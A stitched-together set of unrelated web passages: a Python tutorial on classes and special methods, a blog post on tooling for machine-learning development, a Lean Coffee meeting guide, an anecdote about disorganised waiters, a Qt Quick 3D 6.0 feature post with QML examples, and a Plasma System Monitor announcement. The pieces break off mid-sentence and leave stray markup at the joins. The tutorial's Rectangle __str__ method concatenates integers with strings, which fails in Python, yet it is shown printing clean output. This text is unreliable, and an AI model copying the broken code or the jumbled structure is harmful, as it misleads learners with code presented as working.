        self.age = age</code></pre>



<p><span>There's a lot to notice, but don't worry. This is the <span>basic structure of almost any class you would be writing</span>.</span></p>





<h3><span>The __init__() method</span></h3>



<div>
<p><span>Any function that’s part of a class is a<span> method</span>. Everything known about functions applies to methods as well;&nbsp;</span></p>

<p><span>Methods are a special kind of attribute defined just like a function that collectively describes the behaviors of a class (the actions it can do)</span></p>
</div>

<p><span>The <code>__init__()</code> method on line 2 is a special method that python runs whenever we create a new instance based on the <code>Person</code> class. Note it has two leading underscores and two ending underscores, it helps python to differentiate special methods from regular functions/methods.</span></p>

<p><br>
<span>We define the __init__() method to have 3 parameters: <span>self</span>, <span>name</span>, and <span>age</span>.</span></p>

<p><span>The <code>self</code> parameter is required in a method definition, and it <span>must come first</span> before the other parameters. </span></p>

<p><span>It must be included in the definition because when Python calls this <code>__init__()</code> method later, the method call will automatically pass the self argument.</span><br>
&nbsp;</p>

<p><span>Every method call associated with a class automatically passes self, which is a reference to the instance itself; it gives the individual instance access to the attributes and methods in the class. </span></p>



<p><span>The two variables defined below the method header each have the prefix <span>self</span>.</span></p>

<pre><code>self.name = name
self.age = age</code></pre>

<p><span>Any variable prefixed with self is available to every method in the class, and we’ll also be able to access these variables through any instance created from the class. </span></p>



<h4><span>Creating an instance of the <code>Person</code> class</span></h4>

<pre><code>p1 = Person("Harry", 23)            # first  instance 

p2 = Person("Potter", 32)           # second instance</code></pre>



<p><span>The Person class describes the definitive attributes of a Person; <code>p1</code> and <code>p2</code>&nbsp; are instances of the <span>Person</span> class;</span><br>
<span>Simply said, <code>p1</code> and <code>p2</code> are <span>objects of type, </span><span>Person</span>.</span></p>

<p><span>When we make an instance of <code>Person</code>, Python calls the <code>__init__()</code> method from the Person class. We also pass Person() a <code>name</code> and an <code>age</code> as arguments. <code>self</code> is passed automatically, so we don’t need to pass it.</span></p>

<p><span>Anytime we want to make an instance from the Person class, we’ll provide values for only the last two parameters, name and age.</span></p>

<h4><br>
<span>Accessing Class Attributes</span></h4>

<p><span>In the <code>Person</code> class definition, <code>self.name = name</code> takes the value stored in the parameter <code>name</code> and stores it in the variable <code>name</code>,<br>
The same process happens with <code>self.age = age</code>. </span></p>

<p><span>Variables that are defined in the <code>__init__()</code>&nbsp; are called <span><em>instance attributes. </em></span>They can be accessed by using the dot notation:</span></p>

<pre><code>p1.name         # Harry

p1.age          # 23

p2.name         # Potter

p2.age          # 32</code></pre>

<p><span>To display the output, use the <code>print()</code> function. For example: <code>print(p1.name)</code>.</span></p>





<h3><span>Writing Custom methods in a class</span></h3>

<p><span>So far, we have been introduced to only one method, the <code>__init__() </code>method which is a <span>special method</span>. </span></p>

<p><span>But we need to be able to add our own methods. Let's do that by creating a new class representing a <span>Rectangle</span>.</span></p>

<p><strong><em><span>Brainstorming:</span></em></strong></p>

<ul>
	<li><span>A rectangle object requires a <span>height</span> and a <span>width</span></span></li>
	<li><span>We should be able to perform an operation on the object to get its <span>Area</span> and <span>Perimeter</span></span></li>
	<li><span>We should be able to represent our object in a <span>string format</span>.</span></li>
</ul>

<pre><code>class Rectangle:
    def __init__(self, width, height):                  # special method
        self.width = width
        self.height = height

    def get_area(self):                                 # custom method
        area = self.width * self.height
        return area

    def get_perimeter(self):                            # custom method
        perimeter = (self.width * 2) + (self.height * 2)
        return perimeter
    
    def __str__(self):                                   # special method
        return "width = " + self.width + " &amp; height: " + self.height</code></pre>



<p><span>You should be getting the pattern here; The methods whose names<span> begin and end with double underscores</span>( __methodname__ ) are <span>special methods</span> in python.</span></p>

<p><span>In this case <code>__init__()</code> and <code>__str__()</code> are the special methods.</span></p>

<p><span>The <code>__str__()</code> method allows us to specify a string representation of our object (Rectangle). That representation is what is displayed when our object is passed as an argument to the <code>print()</code> function.</span></p>

<pre><code>r1 = Rectangle(4, 2)

r1.width                        # 4
r1.height                       # 2

# accessing methods
r1.get_area()                   # 8
r1.get_perimeter()              # 12

# calling the __str__() method
print(r1)                       # width = 4 &amp; height: 2</code></pre>



<p><span>Note that if the&nbsp;<code> __str__()</code> method&nbsp; wasn't defined in the class, <code>print(r1)</code> will give you something like this:</span></p>

<pre><code>&lt;__main__.Rectangle object at 0x000002884E517400&gt;</code></pre>

<p><span>Which isn't human-readable. So it is always a good practice to have a string representation of your class.</span></p>



<p><span>To display the output for example of <code>r1.get_area()</code>, you should write it as <code>print(r1.get_area())</code>. </span></p>



<h3><span>Examples of Class Definitions</span></h3>



<p><strong><span>A class representing a Student</span></strong></p>

<pre><code>class Student:
    def __init__(self, name, subject, score):  # __init__() method
        self.name = name
        self.score = score
        self.subject = subject

    def passed(self):  # regular method
        if self.score &gt;= 80:
            return True
        else:
            return False

    def __str__(self):
        return self.name + ": " + self.subject + " student"

# Creating an instance of the class

stud1 = Student('john', 'science', 87)          # first instance of Student
stud2 = Student("prince", 'biology', 34)        # second instance of Student

# accessing a method

print(stud1.passed())           # True

print(stud2.passed())           # False

print(stud1.subject)            # science

print(stud2.subject)            # biology

print(stud1)                    # john: science student</code></pre>





<p><strong><span>A Class representing a Programming Language</span></strong></p>

<pre><code>class Language:
    def __init__(self):
        self.data_types = []

# Using the class

java = Language()

print(java.data_types)             #  []

java.data_types.append('string')
java.data_types.append('double')

print(java.data_types)              # ['string', 'double']</code></pre>





<p><span>Note, writing of <span>efficient methods</span> in class definitions require a stable understanding of functions. Read <a href="https://www.pythonstacks.com/blog/introduction-functions/">Introduction to Functions</a> if you are not familiar with functions in python.</span></p>

      <div>
<p>In today’s world, data has played a huge role in the success of technology giants like Google, Amazon, and Facebook. All of these companies have built massively scalable infrastructure to process data and provide great product experiences for their users. In the last 5 years, we’ve seen a real emergence of AI as a new technology stack. For example, Facebook built an end-to-end platform called <a href="https://code.fb.com/core-data/introducing-fblearner-flow-facebook-s-ai-backbone/">FBLearner</a> that enables an ML Engineer or a Data Scientist build Machine Learning pipelines, run lots of experiments, share model architectures and datasets with team members, scale ML algorithms for billions of Facebook users worldwide. Since its inception, millions of models have been trained on FBLearner and every day these models answer billions of real-time queries to personalize News Feed, show relevant Ads, recommend Friend connections, etc. &nbsp;</p>



<p>However, for most other companies <strong>building AI applications remains extremely expensive</strong>. This is primarily due to<a href="https://venturebeat.com/2018/05/06/forget-agi-lets-build-really-useful-ai-tools/"> a lack of systems and tools</a><strong> </strong>for supporting end-to-end machine learning (ML) application development — from data preparation and labeling to operationalization and monitoring [1][9][10][11]<strong>.</strong></p>



<p>The goal of this post is 2-fold: </p>



<ol><li>List the challenges with adopting AI successfully: data management, model training, evaluation, deployment, and monitoring; </li><li>List the tools I think we need to create to allow developers to meet these challenges: a data-centric IDE with capabilities like explainable recommendations, robust dataset management, model-aware testing, model deployment, measurement, and monitoring capabilities.</li></ol>







<figure><img src="https://lh4.googleusercontent.com/eHHhzc1HYAh18oRETgjri9drWQpHZwF6OkyDRJ5E4r9YxSwqRViLC6LDTOt4UGLhdg0zMmTj7ScuMCOStrJk_jcmLqRrOkm5z7qIDjEIsyeIi8vpw3q8wAhltmiWA3LfUjDGcT3J" alt=""></figure>



<p>In order to build an end-to-end ML platform, a data scientist has to go through multiple hoops of the following workflow [3].</p>



<div><figure><img src="https://lh3.googleusercontent.com/O29ZMh7AatXlnuiH8_QAxbnpcxrVvl_ioNedmGNdks2QMDJbSWt-XpN757fu41qtdpoNgZ_kNYWBOV70s8LSGnMjA96sfW7A6FVX2naSq1Ukav1WlnmD3br_gw4ijLGnG8DDg1L9" alt=""></figure></div>



<p><strong>End-to-End ML Workflow</strong></p>



<p>A big challenge to building AI applications is that different stages of the workflow require new software abstractions that can accommodate complex interactions with the underlying data used in AI training or prediction. For example:</p>



<p><strong>Data Management</strong> requires a data scientist to build and operate systems like Hive, Hadoop, Airflow, Kafka, Spark etc to assemble data from different tables, clean datasets, procure labeling data, construct features and make them ready for training. In most companies, data scientists rely on their data engineering teams to maintain this infrastructure and help build ETL pipelines to get feature datasets ready. </p>



<p><strong>Training models</strong> is more of an art than science. It requires understanding which features work and what modeling algorithms are suitable to the problem at hand. Although there are libraries like PyTorch, TensorFlow, Scikit-Learn etc, there is a lot of manual work in feature selection, parameter optimization, and experimentation.</p>



<p><strong>Model evaluation</strong> is often performed as a team activity since it requires other people to review the model performance across a variety of metrics from AUC, ROC, Precision/Recall and ensure that model is calibrated well, etc. In the case of Facebook, this was built into FBLearner, where every model created on the platform would get an auto-generated dashboard showing all these statistics. &nbsp;</p>



<p><strong>Deploying models </strong>requires data scientists to first pick the optimal model and make it ready to be deployed to production. If the model is going to impact business metrics of the product and will be consumed in a realtime manner, we need to deploy it to only a small % of traffic and run an<strong> A/B test</strong> with an existing production model. Once the A/B test is positive in terms of business metrics, the model gets rolled out to 100% of production traffic.</p>



<p><strong>Inference of the models </strong>is closely tied with deployment, there can be 2 ways a model can be made available for consumption to make predictions. </p>



<ul><li><strong>batch inference</strong>, where a data pipeline is built to scan through a dataset and make predictions on each record or a batch of records.</li><li><strong>realtime inference</strong>, where a micro-service hosts the model and makes predictions in a low-latency manner.</li></ul>



<p><strong>Monitoring predictions </strong>is very important because unlike traditional applications, model performance is non-deterministic and depends on various factors such as seasonality, new user behavior trends, data pipeline unreliability leading to broken features. For example, a perfectly functioning Ads model might need to be updated when a new holiday season arrives or a model trained to show content recommendations in the US may not do very well for users signing up internationally. There is also a need for alerts and notifications to detect model degradation quickly and take action. </p>



<div><figure><img src="https://lh3.googleusercontent.com/4Km_x5ON36tuOWCwHEXI1pvbchanrGvk6ZZr0Zv789WO1g25Qo6T2_St-fnLKIwfitW_l6c304-ZVppb2iz6QRcvcq_cWoQAwrk2XWh26ZhgydZxjXKC0T140HnuJ5hyAMuY9qMt" alt=""></figure></div>



<p>As we can see, the workflow to build machine learning models is significantly different from building general software applications. If models are becoming first-class citizens in the modern enterprise stack, they need better tools. As Tesla’s Director of AI Andrej Karpathy succinctly puts it, <strong>AI is</strong><a href="https://medium.com/@karpathy/software-2-0-a64152b37c35"><strong> Software 2.0</strong></a><strong> and it needs new tools</strong> [2].<br></p>



<figure><img src="https://lh6.googleusercontent.com/ZN2xWg5G0-EYYH2iEQ7b_Vza4SO9wU8YFrKfQyl3NlWatWmz2Z2hMsKtprxOofb7PtwZAXHfeKBjvyF9tKqE4aLSLDOSS_OvaTV1PZ10CbY4N2NEdHogmhoFRVpC3rb2fot3GO9x" alt=""></figure>



<p>If we compare the stack of Software 1.0 with 2.0, I claim we require transformational thinking to build the new developer stack for AI.</p>







<p>In Software 1.0, we have seen a vast amount of tooling built in the past few decades to help developers write code, share it with other developers, get it reviewed, debug it, release it to production and monitor its performance. If we were to map these tools in the 2.0 stack, there is a big gap!<br></p>



<blockquote><p>What would an ideal Developer Toolkit look like for an AI engineer?</p></blockquote>



<p>To start with, we need to take a <strong>data-first approach</strong> as we build this toolkit because, unlike Software 1.0, the fundamental unit of input for 2.0 is data. </p>



<p><strong>Integrated Development Environment (IDE): </strong>Traditional IDEs focus on helping developers write code, focus on features like syntax highlighting, code checkpointing, unit testing, code refactoring, etc. </p>



<figure><img src="https://lh6.googleusercontent.com/ArLnwbA3Hkj2cjWIVDKgHGTjLaNidh98es1ZdDFfETtPEdQpsUiVwuay3LKdkkKVa3Q33TR5PIZPo1ggbI9H1g6ZSv4RuhX8utUkLLI_b40h509nBk7OR3a34oKZ4DZa2cFgJvXj" alt=""></figure>



<p>For machine learning, we need an IDE that allows easy import and exploration of data, cleaning and massaging of tables. Jupyter notebooks are somewhat useful, but they have their own problems, including the lack of versioning and review tools. A powerful 2.0 IDE would be more data-centric, starts with allowing the data scientist to slice and dice data, edit the model architecture either via code or UI and debug the model on egregious cases where it might be not performing well. I see traction in this space with products like StreamLit [13] reimagining IDEs for ML.  <br></p>



<p>Tools like Git, Jenkins, Puppet, Docker have been very successful in traditional software development by taking care of continuous integration and deployment of software. When it comes to machine learning, the following steps would constitute the release process. </p>



<p><strong>Model Versioning:</strong> As more models get into production, managing the various versions of them becomes important. Git can be reused for models, however, it won’t scale for large datasets. The reason to version datasets is that to be able to <strong>reproduce a model</strong>, we need the snapshot of the data the model was trained upon. Naive implementations of this could explode the amount of data we’re versioning, think 1-copy-of-dataset-per-model-version. DVC [12] which is an open-source version control system is a good start and is gaining momentum. </p>



<p><strong>Unit Testing </strong>is another important part of the build &amp; release cycle. For ML, we need unit tests that catch not only code quality bugs but also data quality bugs. </p>



<div><figure><img src="https://lh6.googleusercontent.com/I99g74dfzW1-4MoswbrjtOeSnw7aH0W8UpbwdumvSxN0FgshNyH-Jpa1WNmsJ-uoNScx6qRnw7IfnWSdcEuZekOwX-UMDliYVP69vDAyGpi4CiD0LQfE_lrfYVUWaHmYIwwBqXmS" alt=""></figure></div>



<p><strong>Canary Tests</strong> are minimal tests to quickly and automatically verify that the everything we depend on is ready. We typically run Canary tests before other time-consuming tests, and before wasting time investigating the code when the other tests are failing [8]. In Machine Learning, it means being able to <strong>replay a previous set of examples</strong> on the new Model and ensuring that it meets certain minimal set of conditions. </p>



<p><strong>A/B Testing </strong>is a method of comparing two versions of an application change to determine which one performs better [7]. For ML, AB testing is an experiment where two or more variations of the ML model are exposed to users at random, and statistical analysis is used to determine which variation performs better for a given conversion goal. For example in the dashboard below, we’re measuring click conversion on an A/B experiment dashboard that my team built at Pinterest, and it shows the performance of the ML experiments against business metrics like repins, likes, etc. CometML [14] lets data scientists keep track of ML experiments and collaborate with their team members. </p>

<p><strong>Debugging: </strong>One of the main features of an IDE is the ability to debug the code and find exactly the line where the error occurred. For machine learning, this becomes a hard problem because models are often opaque and therefore exactly pinpointing why a particular example was misclassified is difficult. However, if we can understand the relationship between feature variables and the target variable in a consistent manner, it goes a long way in debugging models, also called<a href="https://christophm.github.io/interpretable-ml-book/"><strong> </strong>model interpretability</a>, which is an active area of research. At Fiddler, we’re working on a product offering that allows data scientists to debug any kind of models and perform root cause analysis. </p>



<p><strong>Profiling: </strong>Performance analysis is an important part of SDLC in 1.0 and profiling tools allow engineers to figure out slowness of an application and improve it. For models, it is also about improving performance metrics like AUC, log loss, etc. Often times, a given model could have a higher score on an aggregate metric but it can be performing poorly on certain instances or subsets of the dataset. This is where tools like &nbsp;Manifold [5] can enhance the capabilities of traditional performance analysis. </p>



<p><strong>Monitoring: </strong>While superficially, application monitoring might seem similar to model monitoring and could actually be a good place to start, we need to track a different class of metrics for machine learning. Monitoring is crucial for models that automatically incorporate new data in a …</p></div></div></div>

<p>I see the same two problems over and over with discussion meetings:</p>



<ul><li>The group spends the whole time talking about just one or two topics, leaving lots of important stuff untouched</li><li>The group talks about whatever got brought up first instead of what is most important</li></ul>



<p><a href="https://agilecoffee.com/leancoffee/">Lean Coffee</a> is a meeting format that fixes both of those, because: </p>



<ul><li>Someone runs a per-topic timer to prevent lingering on the same topic for too long</li><li>The group builds the agenda democratically so the most important stuff gets talked about first</li></ul>



<p>It’s been like <em>magic</em> for many of the meetings I attend.</p>



<hr>



<p>Here’s how to run a Lean Coffee:</p>



<p><strong>Step 1</strong>: Create a kanban board (I like using <a href="https://funretro.io/">FunRetro</a>, but anything that allows voting will work) with 4 columns:</p>



<ul><li>To Discuss</li><li>Discussing</li><li>Discussed</li><li>Action Items</li></ul>



<p><strong>Step 2</strong>: Give everyone 5 minutes to add topics to “To Discuss” and to vote on them. Any topic is fine as long as it’s related to the purpose of the meeting. Everyone gets the same number of votes (usually 3 to 10), but voting multiple times on the same topic is allowed.</p>



<p><strong>Step 3</strong>: Pick the topic with the most votes, drag it to “Discussing”, and start a 5 minute timer to talk about it.</p>



<p><strong>Step 4</strong>: Once the timer runs out, if the majority of people want to keep talking about it, add a couple minutes and repeat. If not, capture any todos in the “Action Items” column and move the topic to the “Discussed” column.</p>



<p><strong>Step 5</strong>: Keep repeating steps 3, 4, and 5 until the meeting time ends. </p>



<p>Try it out and I bet you’ll be amazed at the quality of the discussion it generates. <a href="https://critter.blog/2020/08/12/stop-changing-start-experimenting/">Pitch it as an experiment</a> to your team!</p>

Something like this:</p><figure><img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201%201'%3E%3C/svg%3E" data-src="https://lh5.googleusercontent.com/2f-VfihOSBr5JhzOuIryn1k2zUViZsgdGBL1wqNLJ9s2nDndEeMiWpjE6SxnTBdXdwbW7Do0tvNVTl3pnDK4m2ilEnWrGNRcWQc_xm9mCOhp58Z7bB2kUrOT42X5UIAsGY0I1Prj" alt=""></figure><p>There were 5-7 waiters, and none of them had a clue which table to deliver each dish.</p><p>Every time food came out of the “kitchen” (it was more of a food stall), a waiter would walk around feeling lost like a bee in a faux flower shop, trying to randomly guess the correct table.</p><p>There was no rule.</p><p><strong>All servers could take orders, but no one would write them down. There was no division of sitting areas. It was total randomness, confusion, and running all the time.</strong></p><p>As I was in awe, watching this remarkable scene, a waiter came by and gave me a free drink. He said that he couldn’t find who ordered it and that I seemed like a nice guy so I should have it. Sounds crazy but true. I swear.</p><p>Ironically, they found the client right after I took my first sip.</p><h2>Lesson Learned</h2><p>As I sat there, puzzled, I thought there was something to learn from this experience.</p><p><strong>Sometimes, like those waiters, we are overwhelmed with everything going on (school, relationships, work), so we run on autopilot.</strong></p><p>We think that if we took a moment to breathe and re-assess our situation, we’d drown in commitments. So we continue doing whatever necessary to stay afloat. Work harder. Even if it’s inefficient or counterproductive.</p><p><strong>We are so caught up in the micro that we forget about the macro.</strong></p><p>It would have taken the waiters less than five minutes to split tables, or agree to write down orders.<strong> </strong>With minimal planning, they could have boosted their efficiency, reduced their stress, and improved customer experience.</p><p>Derek Sivers faced a similar issue when running CD Baby. He was too overwhelmed to spend time properly training his employees, so he continued doing almost everything himself. Eventually, he burned out. Then, he realized that he had to take the time to train his personnel. It was hard, but afterward, his team started running the business and <a rel="noreferrer noopener" href="https://sive.rs/delegate" target="_blank">Derek could focus on improvements and innovations </a>(the stuff that he liked!).</p><p><strong>We can do the same when we feel that we are not running our life as much as our life obligations are running us.</strong></p><p>It takes as little as 15 minutes/week to assess if you are spending time in the best way to move towards where you want to be. Then, you can figure out ways to improve.</p><blockquote>— Giorgio Parlato (@giorgiop_) <a href="https://twitter.com/giorgiop_/status/1302273357606318085?ref_src=twsrc%5Etfw">September 5, 2020</a></blockquote>  <h3>Where do you want to go?</h3><p>If you don’t have any vision or direction for your life, it’s good to spend some time figuring that out first.</p><p><strong>If you cruise through life with no direction, you’ll be steered wherever the winds take you.

                                Tuesday November 03, 2020 by <a href="">Andy Nichols (nezticle)</a> | <a href="#commento">Comments</a>
                            </p>
                            
                            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p><span>It has been awhile since I've posted any updates regarding Qt Quick 3D, but not because there has been no progress. In fact quite the opposite: my team and I have been so busy getting Qt Quick 3D ready for 6.0 we haven't had time to talk about all the cool new features we have added. So today I would like to talk about some of the things we have done so far.</span></p>
<!--more-->
<h2><span>Qt Quick 3D Can Render Everywhere</span></h2>
<p><span>The largest development effort for the Qt 6 release was porting the rendering engine to the Qt Rendering Hardware Interface, and this effort will be well worth it because now it is possible to use Qt Quick and Qt Quick 3D with the optimal graphics API for each platform. The list of supported graphics APIs is:</span></p>
<ul>
<li><span>OpenGL (version 3 and higher)</span></li>
<li><span>OpenGL ES (version 2 and higher)</span></li>
<li><span>Vulkan (1.0 and higher)<br></span></li>
<li><span>Direct3D 11 (11.1 and higher)<br></span></li>
<li><span>Metal</span></li>
</ul>
<span>What this means is that whatever platform and graphics API combination you choose to use, Qt Quick 3D will work as expected without you needing to need to know the details how each graphics API works. Any place where graphics API specific knowledge is needed, for example when it comes to coordinate systems, we just use OpenGL semantics and translate them for you to the native API transparently to the application. Graphics development may have gotten harder with the further fragmentation of graphics API's in the last several years, but with Qt Quick and Qt Quick 3D this is not something you will need to worry about.</span>
<h2><span>Deeper Integration of 2D Content in 3D Scenes</span></h2>
<p><span>In previous releases of Qt Quick 3D, all 2D content had to be rendered to an offscreen surface, such as a texture, before it could be used in 3D. This worked very similar to how <a href="https://doc.qt.io/qt-5/qml-qtquick-item.html#item-layers" rel="noopener">Layers</a> work in Qt Quick already. In Qt 6 it is now possible to render 2D Qt Quick Items directly into 3D scenes. So if you have ever been frustrated by the lack of perspective transformations in Qt Quick scenes, this is now a possibility.</span></p>

<p><span>In addition to providing a more direct and efficient rendering path for 2D items in 3D, it should be easier than ever to integrate that 2D content in your scene. Here is an example that demonstrates integrating 2D content into a 3D scene:</span></p>
<br>
<pre><code>
import QtQuick
import QtQuick3D

Window {
    visible: true
    width: 640
    height: 480
    title: qsTr("2D in 3D")
    color: "black"

    View3D {
        anchors.fill: parent

        PerspectiveCamera {
            z: 200
        }

        DirectionalLight {

        }

        Model {
            source: "#Cube"
            materials: DefaultMaterial {}
            eulerRotation.y: 20
            Node {
                // Empty spatial Node to give 2D item
                // a position in 3D space
                y: 100
                Text {
                    // 2D content in 3D
                    anchors.centerIn: parent
                    text: "Cube Label"
                    color: "white"
                }
            }
        }
    }
}
</code></pre>

<p><span>This the above example the Text component is a 2D item that is a child of the 3D Cube, and if that Model were to move around, the 2D item's position would be tied to the Model.</span></p>

<p><span>If you wanted to render Qt Quick content to a texture instead, that is still possible.&nbsp;&nbsp;An example of that would be:</span></p>
<br>
<pre><code>import QtQuick
import QtQuick3D

Window {
    visible: true
    width: 640
    height: 480

    View3D {
        anchors.fill: parent

        PerspectiveCamera {
            z: 200
        }

        DirectionalLight {

        }

        Texture {
            id: dynamicQMLTexture
            sourceItem: Rectangle {
                width: 256
                height: 256
                color: "pink"

                Text {
                    anchors.centerIn: parent
                    text: "Dynamic Texture!"
                    color: "white"
                    font.pointSize: 24
                }
            }
        }

        Model {
            source: "#Cube"
            eulerRotation.y: 20
            materials: DefaultMaterial {
                diffuseMap: dynamicQMLTexture
            }
        }
    }
}</code></pre>
<p><span>In the above example the Texture components content comes from whatever Qt Quick Component is set to set the the sourceItem property. This internally renders that component hierarchy to a QSGTexture that can be used for texture data in the 3D renderer, which in this case is mapped the the cube Model.</span></p>

<h2><span>Improved glTF2 Support</span></h2>
<p><span>Qt Quick 3D really works well with glTF2 content, and now it works even better that ever.&nbsp;&nbsp;With the 6.0 release we have tried to support as much of the base <a href="https://github.com/KhronosGroup/glTF/tree/master/specification/2.0" rel="noopener">glTF2 spec</a> as possible. One of the biggest areas of improvement has been around supporting the animation capabilities of glTF2 assets. It is now possible to import content that contains rigged animations.</span></p>

<p><img src="https://www.qt.io/hs-fs/hubfs/brainstem-dance.gif?width=480&amp;name=brainstem-dance.gif" alt="brainstem-dance" width="480" srcset="https://www.qt.io/hs-fs/hubfs/brainstem-dance.gif?width=240&amp;name=brainstem-dance.gif 240w, https://www.qt.io/hs-fs/hubfs/brainstem-dance.gif?width=480&amp;name=brainstem-dance.gif 480w, https://www.qt.io/hs-fs/hubfs/brainstem-dance.gif?width=720&amp;name=brainstem-dance.gif 720w, https://www.qt.io/hs-fs/hubfs/brainstem-dance.gif?width=960&amp;name=brainstem-dance.gif 960w, https://www.qt.io/hs-fs/hubfs/brainstem-dance.gif?width=1200&amp;name=brainstem-dance.gif 1200w, https://www.qt.io/hs-fs/hubfs/brainstem-dance.gif?width=1440&amp;name=brainstem-dance.gif 1440w" sizes="(max-width: 480px) 100vw, 480px"></p>

<p><span>One of the additional improvements we did to enable more efficient animation support was to add support binary keyframe support to <a href="https://doc-snapshots.qt.io/qt6-dev/qtquicktimeline-index.html" rel="noopener">QtQuickTimeline</a>. This means that components that have complex animations don't need to be represented by thousands of lines of QML.</span></p>

<p><span>One thing that is notably missing from the 6.0 release though is glTF2 Morph animations. The work for this is very far along but unfortunately did not get completed in time to make the 6.0 release. You can expect this feature in a near future release.</span></p>

<p><span>In addition to the animation work, we have put a lot of effort into making sure imported glTF2 assets are rendered the same way they are in your 3D content creation tools. Our goal is to have 100% support for glTF and as many extensions as we can, so moving forward expect more improvements in this area.</span></p>
<h2><span>Redesigned Custom Material and Post-Processing Effects system</span></h2>
<p><span>One of the compromises we had to make with the Qt 5 version of Qt Quick 3D was how Custom Materials and Post Processing Effects were defined. This system was largely the same as what was in Qt 3D Studio, and was unfortunately hard to use and created a lot of complexity in the rendering engine. With Qt 6 and the port to the Rendering Hardware Interface we took a hard look at these systems and determined we could do better.</span></p>
<h3><span>Custom Materials</span></h3>
<p><span>The objective of Custom Materials is to provide users with a way to define their own materials for shading Models in a scene. This traditionally means writing shader code. In Qt Quick we provide an API called ShaderEffect that gives the user a way to apply shader effects to 2D items and a powerful way to bind QML properties as shader uniforms. What we wanted to do was have that same kind of API for 3D Materials, but unlike in 2D there is a lot more state that needs to be considered when writing shader code. For example 3D items need to be aware of things like lighting, shadows, and blending.&nbsp;&nbsp;A shader for rendering&nbsp;a 2D item only needs to work about the source texture as an input, so the shaders can be fairly self contained, but in 3D unless writing very simple materials it isn't possible to just write all the shader code needed for rendering. This means that for most users, creating your own material can be too difficult.</span></p>

<p><span>That is why we decided to create more of a framework for defining materials. Checkout the new custom material API details <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick3d-custommaterial.html" rel="noopener">here</a>.</span></p>
<h3><span>Post-Processing Effects</span></h3>
<p><span>The post-processing effects API is quite similar to how it was in previous releases, but has been updated to follow the same patterns as the new CustomMaterial API. Post-processing effects by their nature are already quite similar to <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick-shadereffect.html" rel="noopener">ShaderEffect</a> in the sense that the majority of the state is that there is an input texture and an output texture. It is not however exactly the same in such a way that we could just use the ShaderEffect API directly, because in addition to the color texture, in 3D you would also have access to a meaningful depth buffer.&nbsp;&nbsp;It is also possible that, unlike ShaderEffect, you need to perform multiple passes to achieve the desired effect, so the Post-Processing Effect API enables that. Checkout the post-processing effects API details <a href="https://doc-snapshots.qt.io/qt6-dev/qml-qtquick3d-effect.html" rel="noopener">here</a>.</span></p>

<p><span>The Custom Material and Post-Processing Effect APIs are very powerful and make possible a lot of interesting use cases and really can't be described thoroughly here, so expect another blog post soon just about these features.&nbsp; If you can't wait there is a comprehensive overview available <a href="https://doc-snapshots.qt.io/qt6-dev/qtquick3d-custom.html" rel="noopener">here </a>with all the details.</span></p>
<h2><span>The Power of QQuickRenderControl with Qt Quick 3D</span></h2>
<p><span>One of the most powerful features of Qt Quick is <a href="https://doc-snapshots.qt.io/qt6-dev/qquickrendercontrol.html" rel="noopener">QQuickRenderControl</a>. QQuickRenderControl allows for users to define exactly how and where Qt Quick content is rendered, for cases where just using a QQuickWindow doesn't make sense. Improvements made to QQuickRenderControl in Qt 6 via the RHI mean that it is now possible to render 3D content with any graphics API in a variety of scenarios. An example of this is that the possibility of rendering to the head mounted displayed used for Virtual Reality and Augmented Reality directly is now possible without having to take inefficient rendering paths.</span></p>

</div>

<p><span>This is only a taste of what is to come, so expect more news in this area in the future.</span></p>
<h2><span>Major Rendering Fidelity Improvements</span></h2>
<p><span>With this release we decided to go through the rendering code with a fine toothed comb and make sure that everything we do is as correct as possible. With the <a href="https://doc.qt.io/qt-5/qml-qtquick3d-principledmaterial.html" rel="noopener">PrincipledMaterial</a> we wanted to provide an easy to use materials that could provide a solution for Physically Based Rendering (PBR), but to do so meant that we need to be very vigilant about how we are rendering. With realtime rendering engines, it is necessary to make compromises and approximations that non-real-time rendering engines don't need to worry about, but that comes at the cost of fidelity. The more corners you cut, the more potential differences are introduced between what the designer of an asset intends vs. what actually gets rendered. So …</span></p></span></p></div></div>

<figcaption>Plasma System Monitor's Overview Page</figcaption></figure>
<p>Plasma System Monitor is a brand new UI for monitoring system resources. It is built on top of Kirigami and a new system statistics service called "KSystemStats" that was debuted in Plasma 5.19. It shares a lot of code with the new system monitor applets that were also introduced in Plasma 5.19. It is meant to be a successor to KSysGuard.</p>
<h2>History</h2>
<figure role="group">
<figcaption>An early version of Plasma System Monitor. While the visuals have not changed much, the underlying technologies changed quite a bit.</figcaption></figure>
<p>Almost two years ago a project was started to create a new backend for monitoring system resources. This was initially intended to support a new set of system monitor widgets for Plasma. While working on this, we realised that the system monitor application could also do with a refresh, which would be a lot simpler now that we had a new system to build upon. After a little bit of iteration we had something that I was mostly happy with, with one major missing feature, there was no way of adding custom pages like KSysGuard has. To support this, we ended up unifying the display code between Plasma System Monitor and Plasma's system monitor applets, allowing one to select different display styles in the applet and also when editing pages in Plasma System Monitor.</p>
<figure role="group">
<figcaption>Unified display styles between System Monitor and Plasma: System Monitor's display configuration on the left, Plasma's applet configuration on the right.</figcaption></figure>
<h2>Features</h2>
<p>On startup, you will be greeted by the Overview page, that has been designed to give a quick overview of your entire system. It provides a view of important core resources: memory, disk space, network and CPU usage. It also provides a small version of the same table as used on the Applications page to give you a  quick view of what applications are consuming the most resources.</p>

<p>Another new feature is the Applications page. This shows you all running applications along with detailed statistics and graphs for those applications. This makes heavy use of the grouping features that were recently introduced to Plasma. See <a rel="noopener noreferrer" href="http://blog.davidedmundson.co.uk/blog/modern-process-management-on-the-desktop/">David Edmundson's blog</a> for more details about this.</p>
<figure role="group">
<figcaption>Processes Page</figcaption></figure>
<p>The Processes page is very similar to the one in KSysGuard, but we have tried our best to streamline it and remove some of the inconsistencies in it. For example, you can now select the "Line Chart" display mode for any column that displays a numeric value. Similarly, the tree view mode no longer requires displaying all processes, but is now a simple mode toggle. (Please note: The tree view mode unfortunately requires Plasma 5.21 because some parts did not make it  for the Plasma 5.20 release.)</p>
<figure role="group">
<figcaption>History Page</figcaption></figure>
<p>The History page has undergone the least functional changes, the most prominent one is that the CPU chart will now be displayed stacked by default.</p>
<figure role="group">
<figcaption>Editing a new page</figcaption></figure>
<p>Should you find the pre-made pages lacking, there is a completely new UI to create and edit pages. The editing UI allows you to divide the page into several different rows, columns and sections. You can then select which sensors you want to display in which way.</p>

